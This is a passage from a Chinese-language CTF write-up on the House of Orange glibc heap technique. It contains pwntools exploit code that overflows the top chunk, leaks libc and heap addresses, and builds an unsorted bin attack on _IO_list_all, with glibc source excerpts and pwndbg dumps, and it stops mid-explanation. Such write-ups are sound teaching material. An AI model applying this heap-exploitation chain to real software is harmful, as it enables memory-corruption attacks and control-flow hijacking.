sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice : '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Name :'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Price of Orange:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Orange:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice : '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Name:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Price of Orange:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Orange:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice : '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    </code></pre>
<h3 id="修改top-chunk-size实现free的效果"><a href="#修改top-chunk-size实现free的效果" class="headerlink" title="修改top chunk size实现free的效果"></a>修改top chunk size实现free的效果</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin),这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins</p>
<p>来看一下这个过程的详细情况，假设目前的top chunk已经不满足malloc的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到libc.so的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验fastbin、small bins、unsorted bin、large bins是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用top chunk，在这里top chunk也不能满足分配的要求，因此会执行如下分支。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*
Otherwise, relay to handle system-dependent cases
*/</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">sysmalloc</span><span class="token punctuation">(</span>nb<span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>perturb_byte<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> p<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>此时ptmalloc已经不能满足用户申请堆内存的操作，需要执行sysmalloc来向系统申请更多的空间。 但是对于堆来说有mmap和brk两种分配方式，需要让堆以brk的形式拓展，之后原有的top chunk会被置于unsorted bin中。</p>
<p>综上，要实现brk拓展top chunk，但是要实现这个目的需要绕过一些libc中的check，首先，malloc的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mp_<span class="token punctuation">.</span>mmap_threshold<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>mp_<span class="token punctuation">.</span>n_mmaps <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>n_mmaps_max<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。</p>
<p>在sysmalloc函数中存在对top chunk size的check，如下</p>
<pre class=" language-c"><code class="language-c"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>old_top <span class="token operator">==</span> <span class="token function">initial_top</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> old_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>
     <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>old_size<span class="token punctuation">)</span> <span class="token operator">>=</span> MINSIZE <span class="token operator">&amp;&amp;</span>
      <span class="token function">prev_inuse</span><span class="token punctuation">(</span>old_top<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>old_end <span class="token operator">&amp;</span> pagemask<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>这里检查了top chunk的合法性，如果第一次调用本函数，top chunk可能没有初始化，所以可能old_size为0，如果top chunk已经初始化了，那么top chunk的大小必须大于等于MINSIZE，因为top chunk中包含了  fencepost，所以top chunk的大小必须要大于MINSIZE。其次Top  chunk必须标识前一个chunk处于inuse状态，并且top chunk的结束地址必定是页对齐的。此外top  chunk除去fencepost的大小必定要小于所需chunk的大小，否则在_int_malloc()函数中会使用top  chunk分割出chunk</p>
<p>总结一下伪造的top chunk size的要求</p>
<p>1.伪造的size必须要对齐到内存页</p>
<p>2.size要大于MINSIZE(0x10)</p>
<p>3.size要小于之后申请的chunk size + MINSIZE(0x10)</p>
<p>4.size的prev inuse位必须为1</p>
<p>之后原有的top chunk就会执行<code>_int_free</code>从而顺利进入unsorted bin中</p>
<p>回到题中,就要得满足以上要求</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> x /40gx 0x555555758060
0x555555758060:    0x0000000000000000    0x0000000000020fa1
0x555555758070:    0x0000000000000000    0x0000000000000000
0x555555758080:    0x0000000000000000    0x0000000000000000
0x555555758090:    0x0000000000000000    0x0000000000000000
0x5555557580a0:    0x0000000000000000    0x0000000000000000
0x5555557580b0:    0x0000000000000000    0x0000000000000000</code></pre>
<p>然而 0x555555758060 + 0x0000000000020fa1 ==  0x555555779001 , 去掉inuse位,则内存是按照0x1000对齐的,则我们所能修改top chunk的大小就可以为: (x * 0x1000 + 0x20fa1) &gt; MINSIZE(0x10) (x 属于 整数),题中在添加的时候,最多只能申请大小为0x1000,那我们就通过堆溢出把top chunk size 改为: 0x0fa1, 然后再申请大于这个top chunk size的chunk就可以实现top chunk free后成为unsoted bin </p>
<pre class=" language-python"><code class="language-python">    ad<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#后一个储存颜色的chunk</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1f00000010</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># top chunk pre_size</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00fa1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># top chunk size</span>
    md<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 堆溢出修改top chunk size</span></code></pre>
<p>实现如下</p>
<pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> bin
fastbins
<span class="token number">0x20</span><span class="token punctuation">:</span> <span class="token number">0x0</span>
<span class="token number">0x30</span><span class="token punctuation">:</span> <span class="token number">0x0</span>
<span class="token number">0x40</span><span class="token punctuation">:</span> <span class="token number">0x0</span>
<span class="token number">0x50</span><span class="token punctuation">:</span> <span class="token number">0x0</span>
<span class="token number">0x60</span><span class="token punctuation">:</span> <span class="token number">0x0</span>
<span class="token number">0x70</span><span class="token punctuation">:</span> <span class="token number">0x0</span>
<span class="token number">0x80</span><span class="token punctuation">:</span> <span class="token number">0x0</span>
unsortedbin
all<span class="token punctuation">:</span> <span class="token number">0x5555557580a0</span> —▸ <span class="token function">0x7ffff7dd1b78</span> <span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">88</span><span class="token punctuation">)</span> ◂— <span class="token number">0x5555557580a0</span>
smallbins
empty
largebins
empty</code></pre>
<h3 id="Leak-libc-and-heap-addr"><a href="#Leak-libc-and-heap-addr" class="headerlink" title="Leak libc and heap addr"></a>Leak libc and heap addr</h3><p>申请一个小于刚才释放 unsoted bin 大小的一个chunk,根据unsoted bin的分割特性,会把main_arena转移,且不会清空chunk 的fd和bk的内容,所以main_arena还存在,直接打印即可获取main_arena地址泄漏libc,但在添加的时候要输入内容,为了得到完整的main_arena地址信息,就填充8个字符到chunk bk位置从而泄漏完整地址, 为了后面要采取伪造fake IO_FILE结构,就要得修改vtable指向当前伪造的虚函数表,那就要得知道heap地址了, 那怎么泄漏 heap地址呢? 由于large bin 大小的chunk有一个特点,申请成功的chunk 的 fd_nextsize和bk_nextsize会填充为自己的地址</p>
<p>large bin申请成功后,会向fd_nextsize和bk_nextsize填充自己的地址代码如下:</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* maintain large bins in sorted order */</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                  <span class="token comment" spellcheck="true">/* Or with inuse bit to speed comparisons */</span>
                  size <span class="token operator">|</span><span class="token operator">=</span> PREV_INUSE<span class="token punctuation">;</span>
                  <span class="token comment" spellcheck="true">/* if smaller than smallest, bypass loop below */</span>
                  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token comment" spellcheck="true">//这里若申请的是符合large bin大小的chunk</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                      <span class="token comment" spellcheck="true">//向后退两个chunk, 而fwd->fd == victim</span>
                      fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span> 
                      bck <span class="token operator">=</span> bck<span class="token operator">-></span>bk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// bck->fd =fwd->bk</span>
                      <span class="token comment" spellcheck="true">//这里的victim 的值就是chunk的申请到的地址</span>
                      victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//还是填充自己本身地址</span>
                      victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//填充之后,再取出来继续填充一样的地址,还是本身地址.</span>
                      fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span> 
                    <span class="token punctuation">}</span>
                  <span class="token keyword">else</span>
                    <span class="token punctuation">{</span>
                      <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fwd<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> fwd<span class="token operator">-></span>size<span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                          fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>
                          <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fwd<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> fwd<span class="token operator">-></span>size<span class="token punctuation">)</span>
                        <span class="token comment" spellcheck="true">/* Always insert in the second position.  */</span>
                        fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>
                      <span class="token keyword">else</span>
                        <span class="token punctuation">{</span>
                          victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
                          victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>
                          fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                          victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                      bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
              <span class="token keyword">else</span>
                victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
            <span class="token punctuation">}</span></code></pre>
<p>成功malloc(0x400)后填充’C’ * 8 的堆数据如下</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> x /40gx 0x5555557580c0
0x5555557580c0:    0x0000000000000000    0x0000000000000411
0x5555557580d0:    0x4343434343434343    0x00007ffff7dd2188 # main_arena + 88
0x5555557580e0:    0x00005555557580c0    0x00005555557580c0 # self heap addr</code></pre>
<p>利用</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># leak libc base with overflow</span>
    ad<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'C'</span> <span class="token operator">*</span> <span class="token number">0x8</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> main_arena <span class="token operator">-</span> <span class="token number">1640</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak heap addr with large bin</span>
    md<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'C'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'CCCCCCCCCCCCCCCC'</span><span class="token punctuation">)</span>
    heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x0a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xc0</span>
    li<span class="token punctuation">(</span><span class="token string">'heap '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="触发异常劫持控制流程"><a href="#触发异常劫持控制流程" class="headerlink" title="触发异常劫持控制流程"></a>触发异常劫持控制流程</h3><p>怎么触发呢? 只要破坏unsorted bin 链表结构,再次申请时就会触发异常,那触发异常就会打印错误信息,<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数，而 malloc_printerr<code>其实是调用</code> <code>__libc_message</code>函数之后调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>, 然后根据<code>IO_list_all</code>中的值去遍历IO_FILE调用IO_FILE 的vtable中的 <code>__overflow</code>函数指针</p>
<h3 id="unsorted-bin-attack-修改-IO-list-all"><a href="#unsorted-bin-attack-修改-IO-list-all" class="headerlink" title="unsorted bin attack 修改 _IO_list_all"></a>unsorted bin attack 修改 <code>_IO_list_all</code></h3><p>如何进行劫持,采用修改old top chunk 的结构,使之报错,然而我们只需要采用unsorted bin attack修改<code>_IO_list_all</code>的值为unsorted_chunks(av)也就是main_arena + 0x58.修改这个有什么用? 本来<code>_IO_list_all</code>的值是指向<code>_IO_2_1_stderr</code>,若修改这个值,那么在malloc报错的时候就会遍历<code>_IO_list_all</code> 指向的IO_FILE结构体，详细后面会说道.</p>
<p>unsorted bin attack 实现攻击源码</p>
<pre class=" language-c"><code class="language-c"> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> bck <span class="token operator">==</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
                victim <span class="token operator">==</span> av<span class="token operator">-></span>last_remainder <span class="token operator">&amp;&amp;</span>
                <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
            <span class="token punctuation">}</span>

            <span class="token comment" spellcheck="true">/* remove from unsorted list */</span>
            <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
            bck<span class="token operator">-></span>fd                 <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//实现想目标处修改值</span></code></pre>
<p>实现修改如下</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> x /10gx &_IO_list_all
0x7ffff7dd2520 <_IO_list_all>:    0x00007ffff7dd1b78    0x0000000000000000
0x7ffff7dd2530:    0x0000000000000000    0x0000000000000000
0x7ffff7dd2540 <_IO_2_1_stderr_>:    0x00000000fbad2086    0x0000000000000000
0x7ffff7dd2550 <_IO_2_1_stderr_+16>:    0x0000000000000000    0x0000000000000000
0x7ffff7dd2560 <_IO_2_1_stderr_+32>:    0x0000000000000000    0x0000000000000000

pwndbg> x /10gx 0x00007ffff7dd1b78
0x7ffff7dd1b78 <main_arena+88>:    0x000055555577a010    0x00005555557584f0
0x7ffff7dd1b88 <main_arena+104>:    0x00005555557584f0    0x00007ffff7dd2510
0x7ffff7dd1b98 <main_arena+120>:    0x00007ffff7dd1b88    0x00007ffff7dd1b88
0x7ffff7dd1ba8 <main_arena+136>:    0x00007ffff7dd1b98    0x00007ffff7dd1b98
0x7ffff7dd1bb8 <main_arena+152>:    0x00007ffff7dd1ba8    0x00007ffff7dd1ba8</code></pre>
<p>利用</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true"># Control program</span>
    p <span class="token operator">=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x400</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>

    <span class="token comment" spellcheck="true"># fake file</span>
    f <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># old top chunk prev_size</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># old top chunk size</span>
    f <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># unsoted bin attack实现修改 _IO_list_all</span></code></pre>
<h3 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h3><p>若下次申请大小为0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 &lt;= 2*SIZE_SZ，就会触发malloc_printerr</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">int</span> iters <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
              <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// 执行该函数</span>
                             <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>
          size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>那么在执行malloc_printerr函数就会执行到<code>_IO_flush_all_lockp</code>, 来了解一下<code>_IO_flush_all_lockp</code> 函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_lock<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_MTSAFE_IO</span>
  <span class="token function">_IO_cleanup_region_start_noarg</span> <span class="token punctuation">(</span>flush_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_IO_lock_lock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
   <span class="token comment" spellcheck="true">//循环遍历IO_FILE,采用 fp->chain来进行获取下一个IO_FILE, 那么</span>
